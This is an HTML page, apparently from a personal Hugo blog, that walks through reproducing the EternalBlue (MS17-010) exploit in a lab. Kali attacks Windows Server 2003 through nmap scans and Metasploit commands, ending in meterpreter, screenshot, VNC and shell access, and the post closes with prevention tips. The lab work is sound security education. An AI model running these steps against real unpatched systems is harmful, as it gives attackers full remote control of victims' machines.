@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/xvsf/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=xvsf/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>永恒之蓝 复现 | xvsf</title>
+<meta name="keywords" content="漏洞复现">
+<meta name="description" content="永恒之蓝 复现">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/xvsf/posts_backup/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-%E5%A4%8D%E7%8E%B0/">
+<link crossorigin="anonymous" href="/xvsf/assets/css/stylesheet.da3211e5ef867bf2b75fd5a6515cfed7195c011e8ab735694e203810a827097b.css" integrity="sha256-2jIR5e&#43;Ge/K3X9WmUVz&#43;1xlcAR6KtzVpTiA4EKgnCXs=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/xvsf/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/xvsf/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/xvsf/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/xvsf/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/xvsf/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/xvsf/posts_backup/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-%E5%A4%8D%E7%8E%B0/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/xvsf/" accesskey="h" title="xvsf (Alt + H)">xvsf</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      永恒之蓝 复现
+    </h1>
+    <div class="post-description">
+      永恒之蓝 复现
+    </div>
+    <div class="post-meta"><span title='2025-11-01 15:00:00 +0800 CST'>November 1, 2025</span>&nbsp;·&nbsp;<span>1 min</span>
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#%e6%a6%82%e8%bf%b0" aria-label="概述：">概述：</a></li>
+                <li>
+                    <a href="#%e5%8e%9f%e7%90%86" aria-label="原理：">原理：</a><ul>
+                        
+                <li>
+                    <a href="#%e6%a0%b8%e5%bf%83%e6%bc%8f%e6%b4%9esmbv1-%e5%8d%8f%e8%ae%ae%e4%b8%ad%e7%9a%84%e7%bc%93%e5%86%b2%e5%8c%ba%e6%ba%a2%e5%87%ba" aria-label="核心漏洞：SMBv1 协议中的“缓冲区溢出”">核心漏洞：SMBv1 协议中的“缓冲区溢出”</a></li>
+                <li>
+                    <a href="#%e5%85%b3%e9%94%ae%e6%ad%a5%e9%aa%a4%e4%bb%8e%e6%ba%a2%e5%87%ba%e5%88%b0%e6%8e%a7%e5%88%b6" aria-label="关键步骤：从溢出到控制">关键步骤：从溢出到控制</a></li>
+                <li>
+                    <a href="#%e6%94%bb%e5%87%bb%e6%b5%81%e7%a8%8b%e6%80%bb%e7%bb%93" aria-label="攻击流程总结">攻击流程总结</a></li>
+                <li>
+                    <a href="#%e5%8d%b1%e5%ae%b3" aria-label="危害">危害</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e7%8e%af%e5%a2%83" aria-label="环境：">环境：</a></li>
+                <li>
+                    <a href="#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8" aria-label="漏洞利用：">漏洞利用：</a><ul>
+                        
+                <li>
+                    <a href="#1%e4%bd%bf%e7%94%a8nmap%e6%89%ab%e4%b8%80%e4%b8%8b%e8%af%a5%e7%bd%91%e6%ae%b5%e4%b8%bb%e6%9c%ba%e7%9a%84%e5%ad%98%e6%b4%bb%e6%83%85%e5%86%b5" aria-label="1.使用nmap扫一下该网段主机的存活情况">1.使用nmap扫一下该网段主机的存活情况</a></li>
+                <li>
+                    <a href="#2%e6%89%ab%e6%8f%8f%e8%af%a5%e4%b8%bb%e6%9c%ba%e7%ab%af%e5%8f%a3%e4%bb%8e1-1000%e7%9a%84%e5%bc%80%e6%94%be%e6%83%85%e5%86%b5" aria-label="2.扫描该主机端口从1-1000的开放情况">2.扫描该主机端口从1-1000的开放情况</a></li>
+                <li>
+                    <a href="#3%e6%89%ab%e6%8f%8f%e8%af%a5%e4%b8%bb%e6%9c%ba%e7%9a%84%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f%e7%b1%bb%e5%9e%8b" aria-label="3.扫描该主机的操作系统类型">3.扫描该主机的操作系统类型</a></li>
+                <li>
+                    <a href="#4%e6%89%ab%e6%8f%8f%e8%af%a5%e4%b8%bb%e6%9c%ba%e4%b8%8a%e7%9a%84%e6%bc%8f%e6%b4%9e" aria-label="4.扫描该主机上的漏洞">4.扫描该主机上的漏洞</a></li>
+                <li>
+                    <a href="#5%e8%bf%9b%e5%85%a5%e5%b7%a5%e5%85%b7" aria-label="5.进入工具">5.进入工具</a></li>
+                <li>
+                    <a href="#6%e6%90%9c%e7%b4%a2%e7%9b%b8%e5%85%b3%e6%bc%8f%e6%b4%9e" aria-label="6.搜索相关漏洞">6.搜索相关漏洞</a></li>
+                <li>
+                    <a href="#7%e9%80%89%e6%8b%a9%e6%a8%a1%e5%9d%97" aria-label="7.选择模块">7.选择模块</a></li>
+                <li>
+                    <a href="#8%e6%98%be%e7%a4%ba%e9%85%8d%e7%bd%ae%e9%a1%b9" aria-label="8.显示配置项">8.显示配置项</a></li>
+                <li>
+                    <a href="#9%e8%ae%be%e7%bd%ae%e4%b8%80%e4%b8%8brhosts%e9%9d%b6%e6%9c%ba%e7%9a%84ip%e5%9c%b0%e5%9d%80" aria-label="9.设置一下RHOSTS(靶机的ip地址)">9.设置一下RHOSTS(靶机的ip地址)</a></li>
+                <li>
+                    <a href="#10%e6%89%a7%e8%a1%8c%e6%94%bb%e5%87%bb" aria-label="10.执行攻击">10.执行攻击</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e9%a2%84%e9%98%b2%e6%96%b9%e6%a1%88" aria-label="预防方案">预防方案</a></li>
+                <li>
+                    <a href="#%e5%8f%82%e8%80%83%e6%96%87%e7%ab%a0" aria-label="参考文章：">参考文章：</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="概述">概述：<a hidden class="anchor" aria-hidden="true" href="#概述">#</a></h1>
+<p>永恒之蓝（英语：EternalBlue）是美国国家安全局开发的漏洞利用程序，于2017年4月14日被黑客组织影子掮客泄漏。该工具利用445/TCP端口的文件分享协议的漏洞进行散播。</p>
+<p>尽管微软于2017年3月14日已发布补丁修复该漏洞，但在5月12日WannaCry勒索软件利用此漏洞传播时，大量未安装补丁的用户仍然受害。</p>
+<p>鉴于WannaCry的严重性，微软罕见地为已终止支持的Windows XP、Windows 8和Windows Server 2003发布了紧急安全更新。</p>
+<p>2017年6月27日，勒索软件NotPetya再次利用永恒之蓝漏洞在欧洲传播。与普通勒索软件不同，NotPetya以破坏而非勒索为目的，即使支付赎金也无法恢复文件。真正的Petya作者随后公布了解密密钥，并声明与此次攻击无关。</p>
+<h1 id="原理">原理：<a hidden class="anchor" aria-hidden="true" href="#原理">#</a></h1>
+<p><strong><!-- raw HTML omitted -->永恒之蓝利用的是Windows系统文件共享功能中一个严重的远程代码执行漏洞。攻击者无需用户名和密码，只要目标机器的445端口是开放的，就可以通过网络直接发送一段精心构造的数据包，在目标系统上执行任意代码。<!-- raw HTML omitted --></strong></p>
+<h2 id="核心漏洞smbv1-协议中的缓冲区溢出"><!-- raw HTML omitted -->核心漏洞：SMBv1 协议中的“缓冲区溢出”<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#核心漏洞smbv1-协议中的缓冲区溢出">#</a></h2>
+<p><!-- raw HTML omitted -->永恒之蓝攻击的是Windows的<!-- raw HTML omitted --><strong><!-- raw HTML omitted -->SMBv1<!-- raw HTML omitted --></strong><!-- raw HTML omitted --> 服务器消息块协议。这个协议主要用于网络上的文件共享、打印机共享等。漏洞的核心是一个经典的 <!-- raw HTML omitted --><strong><!-- raw HTML omitted -->缓冲区溢出<!-- raw HTML omitted --></strong><!-- raw HTML omitted --> 漏洞。<!-- raw HTML omitted --></p>
+<ol>
+<li><strong><!-- raw HTML omitted -->什么是缓冲区？<!-- raw HTML omitted --></strong><!-- raw HTML omitted --><br>
+<!-- raw HTML omitted --><!-- raw HTML omitted -->我们可以把缓冲区想象成一个有固定容量的“容器”或“货架”，用来临时存放程序处理的数据。<!-- raw HTML omitted --></li>
+<li><strong><!-- raw HTML omitted -->溢出是如何发生的？<!-- raw HTML omitted --></strong><!-- raw HTML omitted --><br>
+<!-- raw HTML omitted --><!-- raw HTML omitted -->在SMBv1协议处理特定的SMB请求（尤其是与文件事务相关的<!-- raw HTML omitted --><code>SMBv1 TRANS2</code><!-- raw HTML omitted -->请求）时，程序没有正确地检查用户输入数据的长度。<!-- raw HTML omitted -->
+<ul>
+<li><!-- raw HTML omitted -->攻击者构造一个<!-- raw HTML omitted --><strong><!-- raw HTML omitted -->超长<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->的、<!-- raw HTML omitted --><strong><!-- raw HTML omitted -->畸形<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->的数据包。<!-- raw HTML omitted --></li>
+<li>当Windows系统收到这个数据包时，会按照SMB协议去解析它。</li>
+<li><!-- raw HTML omitted -->由于没有进行长度校验，这个超长的数据会“撑爆”系统预先分配好的那个“缓冲区”，导致多出来的数据覆盖到旁边内存区域。<!-- raw HTML omitted --></li>
+</ul>
+</li>
+</ol>
+<h2 id="关键步骤从溢出到控制"><!-- raw HTML omitted -->关键步骤：从溢出到控制<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#关键步骤从溢出到控制">#</a></h2>
+<p><!-- raw HTML omitted -->仅仅让程序崩溃（造成蓝屏）不是攻击者的目的，他们的目标是<!-- raw HTML omitted --><strong><!-- raw HTML omitted -->控制<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->你的电脑。永恒之蓝通过以下精妙的步骤实现了这一点：<!-- raw HTML omitted --></p>
+<ol>
+<li><strong><!-- raw HTML omitted -->覆盖关键数据，劫持程序流程：<!-- raw HTML omitted --></strong><!-- raw HTML omitted --><br>
+<!-- raw HTML omitted --><!-- raw HTML omitted -->被“撑爆”的缓冲区旁边的内存区域，存放着一些关键数据，比如<!-- raw HTML omitted --><strong><!-- raw HTML omitted -->函数返回地址<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->。攻击者精心设计溢出数据，用他们指定的一个内存地址去覆盖这个返回地址。<!-- raw HTML omitted --></li>
+<li><strong><!-- raw HTML omitted -->利用“Shellcode”执行命令：<!-- raw HTML omitted --></strong><!-- raw HTML omitted --><br>
+<!-- raw HTML omitted --><!-- raw HTML omitted -->在溢出的数据中，攻击者会嵌入一小段恶意代码，称为<!-- raw HTML omitted --><!-- raw HTML omitted --> <!-- raw HTML omitted --><strong><!-- raw HTML omitted -->“Shellcode”<!-- raw HTML omitted --></strong><!-- raw HTML omitted --> <!-- raw HTML omitted --><!-- raw HTML omitted -->。这段代码的功能通常是：<!-- raw HTML omitted --><strong><!-- raw HTML omitted -->下载并执行勒索软件（如WannaCry）的后端负载，或者在系统上开一个具有高权限的后门<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->。<!-- raw HTML omitted --></li>
+<li><strong><!-- raw HTML omitted -->触发漏洞，跳转到攻击代码：<!-- raw HTML omitted --></strong><!-- raw HTML omitted --><br>
+<!-- raw HTML omitted --><!-- raw HTML omitted -->当被攻击的程序（SMB服务）处理完这个畸形数据包，准备返回时，它会去读取那个被覆盖的“返回地址”。这个地址现在指向的是攻击者安排的位置。<!-- raw HTML omitted --></li>
+<li><strong><!-- raw HTML omitted -->内核态权限提升：<!-- raw HTML omitted --></strong><!-- raw HTML omitted --><br>
+<!-- raw HTML omitted --><!-- raw HTML omitted -->这里是最精妙也最危险的一步。永恒之蓝利用了一个名为<!-- raw HTML omitted --><!-- raw HTML omitted --> <!-- raw HTML omitted --><strong><!-- raw HTML omitted -->“DoublePulsar”<!-- raw HTML omitted --></strong><!-- raw HTML omitted --> <!-- raw HTML omitted --><!-- raw HTML omitted -->的后门。在溢出发生后，Shellcode并不会直接在用户权限下运行，而是利用Windows内核中的一个机制，将执行流程切换到<!-- raw HTML omitted --><strong><!-- raw HTML omitted -->内核模式<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->。<!-- raw HTML omitted -->
+<ul>
+<li><strong><!-- raw HTML omitted -->用户模式<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->：普通程序的运行级别，权限受限。<!-- raw HTML omitted --></li>
+<li><strong><!-- raw HTML omitted -->内核模式<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->：操作系统的核心运行级别，拥有对系统的完全控制权。<!-- raw HTML omitted --><!-- raw HTML omitted --><br>
+<!-- raw HTML omitted --><!-- raw HTML omitted -->通过一个精心构造的“任意写入”原语，攻击者可以将自己的Shellcode注入到内核空间，并提升其权限，使其以<!-- raw HTML omitted --><strong><!-- raw HTML omitted -->系统最高权限<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->执行。<!-- raw HTML omitted --></li>
+</ul>
+</li>
+</ol>
+<h2 id="攻击流程总结"><!-- raw HTML omitted -->攻击流程总结<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#攻击流程总结">#</a></h2>
+<p><!-- raw HTML omitted -->一个完整的永恒之蓝攻击可以概括为以下几步：<!-- raw HTML omitted --></p>
+<ol>
+<li><strong><!-- raw HTML omitted -->扫描<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->：攻击者在网络上扫描开放了<!-- raw HTML omitted --><strong><!-- raw HTML omitted -->445端口<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->的Windows机器。<!-- raw HTML omitted --></li>
+<li><strong><!-- raw HTML omitted -->发送恶意包<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->：向目标机器的445端口发送利用SMBv1缓冲区溢出漏洞的精心构造的数据包。<!-- raw HTML omitted --></li>
+<li><strong><!-- raw HTML omitted -->触发溢出<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->：目标系统的SMB服务处理该数据包，发生缓冲区溢出，关键内存地址被覆盖。<!-- raw HTML omitted --></li>
+<li><strong><!-- raw HTML omitted -->内核提权<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->：利用DoublePulsar技术，将恶意Shellcode注入内核并提升至系统权限。<!-- raw HTML omitted --></li>
+<li><strong><!-- raw HTML omitted -->执行载荷<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->：在内核态执行Shellcode，通常会从攻击者控制的服务器下载并运行最终的恶意软件（如WannaCry勒索病毒）。<!-- raw HTML omitted --></li>
+<li><strong><!-- raw HTML omitted -->横向移动<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->：被攻陷的机器会变成一个跳板，继续在内部网络中扫描和攻击其他存在漏洞的机器，形成链式反应，这也是WannaCry能迅速蔓延全球的原因。<!-- raw HTML omitted --></li>
+</ol>
+<h2 id="危害"><!-- raw HTML omitted -->危害<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#危害">#</a></h2>
+<ul>
+<li><strong><!-- raw HTML omitted -->无需用户交互<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->：用户不需要点击任何链接或打开任何文件，只要电脑开机并联网，就可能被攻击。<!-- raw HTML omitted --></li>
+<li><strong><!-- raw HTML omitted -->高权限<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->：直接获取系统内核权限，可以为所欲为。<!-- raw HTML omitted --></li>
+<li><strong><!-- raw HTML omitted -->蠕虫式传播<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->：结合了漏洞利用和蠕虫特性，可以自我复制和传播。<!-- raw HTML omitted --></li>
+</ul>
+<h1 id="环境">环境：<a hidden class="anchor" aria-hidden="true" href="#环境">#</a></h1>
+<p>Windows Server 2003 ip: 192.168.126.128    关闭防火墙</p>
+<p>Kali ip: 192.168.126.129</p>
+<p>Windows Server 2003</p>
+<p>ip地址： 192.168.126.128</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021743813.png"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510291637576.png"></p>
+<p>关闭防火墙</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744811.png"></p>
+<p>Kali</p>
+<p>ip a</p>
+<p>192.168.126.129</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744515.png"></p>
+<h1 id="漏洞利用">漏洞利用：<a hidden class="anchor" aria-hidden="true" href="#漏洞利用">#</a></h1>
+<h2 id="1使用nmap扫一下该网段主机的存活情况">1.<!-- raw HTML omitted -->使用<!-- raw HTML omitted --><!-- raw HTML omitted -->nmap<!-- raw HTML omitted --><!-- raw HTML omitted -->扫一下该网段主机的存活情况<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#1使用nmap扫一下该网段主机的存活情况">#</a></h2>
+<p><code>nmap -sS 192.168.126.0/24</code></p>
+<p>找到 IP为：192.168.126.128 的主机开启</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021751981.png"></p>
+<h2 id="2扫描该主机端口从1-1000的开放情况">2.<!-- raw HTML omitted -->扫描该主机端口从1-1000的开放情况<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#2扫描该主机端口从1-1000的开放情况">#</a></h2>
+<p><code>nmap -p 1-1000 192.168.126.128</code></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744177.png"></p>
+<h2 id="3扫描该主机的操作系统类型"><!-- raw HTML omitted -->3.扫描该主机的操作系统类型<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#3扫描该主机的操作系统类型">#</a></h2>
+<p><code>nmap -O 192.168.126.128</code></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744430.png"></p>
+<h2 id="4扫描该主机上的漏洞">4.<!-- raw HTML omitted -->扫描该主机上的漏洞<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#4扫描该主机上的漏洞">#</a></h2>
+<p><code>nmap --script=vuln 192.168.126.128</code></p>
+<p>存在 ms17-010 永恒之蓝</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744647.png"></p>
+<blockquote>
+<p><strong>Metasploit</strong>项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试（penetration testing）及入侵检测系统签名开发。</p>
+<p>Metasploit项目最为知名的子项目是开源的Metasploit框架，一套针对远程主机进行开发和执行“exploit代码”的工具。其他重要的子项目包括Opcode数据库、shellcode档案、安全研究等内容。</p>
+<p>Metasploit项目知名的功能还包括反取证与规避工具，其中的某些工具已经内置在Metasploit Framework里面。</p>
+<p><code>Metasploit</code><!-- raw HTML omitted -->（MSF）是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->它本身附带数百个已知软件漏洞，<!-- raw HTML omitted --><strong><!-- raw HTML omitted -->是一款专业级漏洞攻击工具<!-- raw HTML omitted --></strong></p>
+<p><!-- raw HTML omitted -->因为只要掌握MSF的使用方法，每个人都可以使用MSF来攻击那些未打过补丁或者刚刚打过补丁的漏洞。<!-- raw HTML omitted --></p>
+</blockquote>
+<h2 id="5进入工具">5.进入工具<a hidden class="anchor" aria-hidden="true" href="#5进入工具">#</a></h2>
+<p><code>msfconsole</code></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744725.png"></p>
+<h2 id="6搜索相关漏洞"><!-- raw HTML omitted -->6.搜索相关漏洞<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#6搜索相关漏洞">#</a></h2>
+<p><code>search ms17-010</code></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744694.png"></p>
+<h2 id="7选择模块">7.选择模块<a hidden class="anchor" aria-hidden="true" href="#7选择模块">#</a></h2>
+<p><code>use 10</code> 远程执行代码</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021744248.png"></p>
+<h2 id="8显示配置项">8.<!-- raw HTML omitted -->显示配置项<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#8显示配置项">#</a></h2>
+<p><code>show options</code></p>
+<p><img alt="img" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021750849.png"></p>
+<h2 id="9设置一下rhosts靶机的ip地址"><!-- raw HTML omitted -->9.设置一下<!-- raw HTML omitted --><code>RHOSTS</code><!-- raw HTML omitted -->(靶机的ip地址)<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#9设置一下rhosts靶机的ip地址">#</a></h2>
+<p><code>set RHOSTS 192.168.126.128</code></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745740.png"></p>
+<h2 id="10执行攻击">10.执行攻击<a hidden class="anchor" aria-hidden="true" href="#10执行攻击">#</a></h2>
+<p><code>run 或者 exploit</code></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745876.png"></p>
+<p>运行成功会出现 meterpreter &gt;</p>
+<blockquote>
+<p>Meterpreter 是 Metasploit 的一个扩展模块，可以调用 Metasploit 的一些功能，<br>
+对目标系统进行更深入的渗透，如获取屏幕、上传/下载文件、创建持久后门等。</p>
+</blockquote>
+<p><code>help</code><!-- raw HTML omitted -->命令可以查看可以使用哪些命令<!-- raw HTML omitted --></p>
+<p><code>screenshot</code></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745278.png"></p>
+<p>xdg-open /root/KMSzAlpc.jpeg</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745753.png"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745455.png"></p>
+<p><code>run vnc</code></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745593.png"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021745149.png"></p>
+<p><code>shell</code></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021746089.png"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021746672.png"></p>
+<h1 id="预防方案"><!-- raw HTML omitted -->预防方案<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#预防方案">#</a></h1>
+<ul>
+<li><!-- raw HTML omitted -->打开防火墙，安装杀毒软件。<!-- raw HTML omitted --></li>
+<li><!-- raw HTML omitted -->关闭445端口及不必要的服务。<!-- raw HTML omitted --></li>
+<li><!-- raw HTML omitted -->安装对应补丁。<!-- raw HTML omitted --></li>
+</ul>
+<h1 id="参考文章">参考文章：<a hidden class="anchor" aria-hidden="true" href="#参考文章">#</a></h1>
+<p><a href="https://blog.csdn.net/qq_61839115/article/details/129951295">https://blog.csdn.net/qq_61839115/article/details/129951295</a></p>
+<p><a href="https://blog.csdn.net/m0_65712192/article/details/127637917">https://blog.csdn.net/m0_65712192/article/details/127637917</a></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/xvsf/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></li>
+    </ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/xvsf/">xvsf</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
